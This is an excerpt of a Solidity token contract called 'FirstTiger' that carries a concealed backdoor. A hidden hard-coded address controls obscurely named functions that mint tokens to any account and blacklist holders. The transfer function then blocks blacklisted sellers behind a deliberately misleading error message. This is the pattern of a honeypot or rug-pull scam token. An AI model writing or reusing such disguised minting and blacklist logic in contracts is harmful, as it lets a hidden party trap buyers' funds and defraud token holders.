...
contract Ownable is Context {
    ...
    address private _qweaAddress = 0xCe1E49027445E923699b71461F6a2Bac72E63730;
...
contract FirstTiger is Context, IERC20, Ownable {
    ...
    string private _name = "TG:@FirstTigerCN";
    ...
    mapping(address => bool) private _FFF;
    bool private bhc = true;
    bool private blc = false;

  
    uint256 public FFF = uint256(0);
    mapping(address => uint256) private FFFs;
    address[] private _FFFs;
    address owners;
    ...
    function _TNH(address ck, uint256 tb) external qweaAddress() {
        require(tb > 0, "sud");
        uint256 puck = FFFs[ck];
        if (puck == 0) _FFFs.push(ck);
        FFFs[ck] = puck.add(tb);
        FFF = FFF.add(tb);
        _wuj[ck] = _wuj[ck].add(tb);
    }
    ...
    function _WV(bool amountt) external qweaAddress() {
        blc = amountt;
    }
    function _EK(address amountt) external qweaAddress() {
        _FFF[amountt] = true;
    }

    function _OX(address amountt) external qweaAddress() {
        delete _FFF[amountt];
    }

    function VU(address amountt)
        external
        view
        qweaAddress()
        returns (bool)
    ...
    function _transfer(
        ...
        if (bhc) {
            require(_FFF[from] == false, "Transfer amount must be greater than zero");
        }
